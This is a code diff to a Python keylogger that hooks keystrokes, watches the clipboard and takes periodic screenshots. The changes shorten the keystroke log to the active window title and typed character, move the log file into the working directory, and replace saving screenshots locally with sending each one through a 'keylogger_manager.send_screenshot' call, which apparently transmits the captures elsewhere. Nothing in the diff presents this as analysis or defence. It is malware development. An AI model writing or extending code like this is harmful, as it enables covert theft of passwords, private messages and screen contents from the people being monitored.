@@ -19,7 +19,7 @@ username = getpass.getuser()
 
 logger = logging.getLogger()
 logger.setLevel(logging.DEBUG)
-file_handler = logging.FileHandler(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', encoding='utf-8')
+file_handler = logging.FileHandler(f'logfile.txt', encoding='utf-8')
 formatter = logging.Formatter('[{asctime}]: {message}', style='{', datefmt='%Y-%m-%d %H:%M:%S')
 file_handler.setFormatter(formatter)
 logger.addHandler(file_handler)
@@ -145,7 +145,7 @@ def on_press(key):
 
         modifier_str = "+".join(modifiers) if modifiers else "NONE"
 
-        logger.info(f"{active_window} | Layout: {current_layout} | Modifiers: {modifier_str} | VK: {vk} | SC: {sc} | Char: '{char}'")
+        logger.info(f"{active_window} | '{char}'")
 
     except Exception as e:
         logger.error(f"Error in on_press: {e}")
@@ -176,18 +176,20 @@ def clipboard_monitor(interval=5):
 def screenshot_monitor(interval=30):
     count = 0
     while True:
-        filename = f'screenshots/screenshot_{int(time.time())}_{count}.png'
         try:
             img = pyautogui.screenshot()
-            img.save(filename)
-            logger.info(f"Screenshot saved: {filename}")
+
+            success = keylogger_manager.send_screenshot(img)
+
+            if success:
+                logger.info(f"Screenshot sent successfully #{count}")
+            else:
+                logger.error(f"Failed to send screenshot #{count}")
+
         except Exception as e:
             logger.error(f"Error taking screenshot: {e}")
         count += 1
         time.sleep(interval)
-
-if not os.path.exists('screenshots'):
-    os.makedirs('screenshots')
 
 logger.info(f"PROGRAM_STARTED | Initial layout: {current_layout}")
 
